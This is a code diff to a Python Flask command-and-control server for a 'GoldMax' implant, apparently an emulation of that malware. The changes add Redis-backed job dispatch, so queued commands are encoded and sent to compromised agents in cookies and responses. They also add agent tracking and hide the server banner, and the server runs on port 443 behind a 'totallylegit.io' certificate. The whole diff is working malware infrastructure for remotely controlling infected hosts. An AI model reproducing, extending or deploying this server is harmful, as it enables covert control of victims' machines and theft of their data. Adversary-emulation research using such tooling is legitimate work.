@@ -5,10 +5,11 @@ import sys
 import hexdump
 from flask import Flask, request, cli, make_response
 from colorama import Fore as Color
-from .GoldMax import GoldMax
 from random import randbytes
 from datetime import datetime
 from os import environ, path, getcwd
+from .RedisDB import RedisDB
+from .GoldMax import GoldMax
 
 # Flask App
 app = Flask(__name__)
@@ -27,10 +28,11 @@ request_session_key = control_cookie + 'ndB3gbMjL'
 @app.after_request
 def remove_header(response):
     headers = list(response.headers)
+    """
     if environ.get('DEBUG'):
         for header in headers:
             print(Color.GREEN, '\t\t' + header[0] + ": " + header[1], Color.RESET)
-
+    """
     return response
 
 
@@ -54,15 +56,14 @@ def initial_authentication(http_info, cookie_values) -> list:
     Phase 1: Generate shared secret
     """
     gold = GoldMax()
-    print(Color.RED, f'[!] Received Request from GoldMax Implant for SHARED SECRET [!]'
-                     f'\n\tTarget: {http_info["Host"]}'
-                     f'\n\tUser-Agent: {http_info["User-Agent"]}'
-                     f'\n\tReferer: {http_info["Referer"]}'
-                     f'\n\tCookie: {cookie_values}'
+    print(Color.LIGHTYELLOW_EX, f"\n[!] Received Request from GoldMax Implant for SHARED SECRET [!]"
+                                f'\n\tTarget: {http_info["Host"]}'
+                                f'\n\tUser-Agent: {http_info["User-Agent"]}'
+                                f'\n\tReferer: {http_info["Referer"]}'
+                                f'\n\tCookie: {cookie_values}'
           )
-    print(Color.YELLOW, f"\t [+] Initiating Shared Secret Exchange [+]\n\t\tSending Fist Bump: {gold.shared_secret}",
-          Color.RESET
-          )
+    print(Color.LIGHTYELLOW_EX, f"\n[+] Initiating Shared Secret Exchange [+]\n\tSending Fist Bump: {gold.shared_secret}",
+          Color.RESET)
 
     return [gold.state['Authenticate'], gold.shared_secret]
 
@@ -75,25 +76,44 @@ def key_exchange(http_info, cookie_values) -> list:
     print(Color.GREEN, f'\n[!] New GoldMax Agent! [!]'
                        f'\n\tTarget: {http_info["Host"]}'
                        f' \n\tReferer: {http_info["Referer"]}'
-                       f'\n\tCookie: {cookie_values}'
-          )
+                       f'\n\tCookie: {cookie_values}',
+          Color.RESET)
 
     return [gold.state["KeyExchange"], gold.get_session_key()]
 
 
-def create_response():
+def create_response(agent=None):
     """
     Extract job from Database and prepare for implant
     """
-    return ['', '']
+    gold = GoldMax()
+    db = RedisDB()
+    new_cookie = ""
+    cmd_to_send = ""
+
+    # Updates Jobs from Pending -> Active in Redis
+    job = db.get_jobs(agent)
+
+    if job:
+        next_job = list(job.values())[0]
+        new_cookie, cmd_to_send = gold.build_cmd(next_job["cmd"], agent)
+        print(f"Sending job to agent:\n\tCookie: {new_cookie}\n\tPayload: {cmd_to_send}")
+
+    else:
+        new_cookie = gold.build_cookie("Idle", agent)
+
+    return new_cookie, cmd_to_send
 
 
 def establish_session(http_headers, http_uri) -> list:
     """
     Handle comms to setup session for resolving commands
     """
+
     gold = GoldMax()
-    session_data = []
+    db = RedisDB()
+
+    session_data = ["", ""]
 
     # Extract info from headers
     http_info = parse_headers(headers=http_headers, uri=http_uri)
@@ -114,18 +134,22 @@ def establish_session(http_headers, http_uri) -> list:
 
     # Phase 3 : Send Command
     if len(cookie_values) == 2:
-        session_data = create_response()
+        session_data = create_response(agent_name)
 
     # Recv'd some error
     else:
-        print(Color.RED, http_info, Color.RESET)
+        pass
+        # We hit this when we get a referer other than twitter.com
+        # print(Color.RED, "We are hitting an error: \n", http_info, Color.RESET)
+
+    db.update_agent(agent_name, http_info)
 
     return session_data
 
 
 def start_http():
     ssl_info = ('toolbox/certs/totallylegit.io.crt', 'toolbox/certs/totallylegit.io.key')
-    #cli.show_server_banner = lambda *_: None
+    cli.show_server_banner = lambda *_: None
     app.run(ssl_context=ssl_info, port=443, host='0.0.0.0')
 
 
@@ -141,13 +165,11 @@ def http_server(u_path):
 
     if request.method == "GET":
         headers = request.headers
-        print(Color.CYAN, f"\n[!] Received GET request from Implant : ({timestamp}) [!]", Color.RESET)
-
+        # print(Color.CYAN, f"\n[!] Received GET request from Implant : ({timestamp}) [!]", Color.RESET)
         info = parse_headers(headers, u_path)
 
         new_cookie, data_for_agent = establish_session(headers, u_path)
-
-        print(f"Sending: {new_cookie} {data_for_agent} ")
+        # print(f"Sending: {new_cookie} {data_for_agent} ")
 
         return data_for_agent, 200, {'Cookie': new_cookie}
 
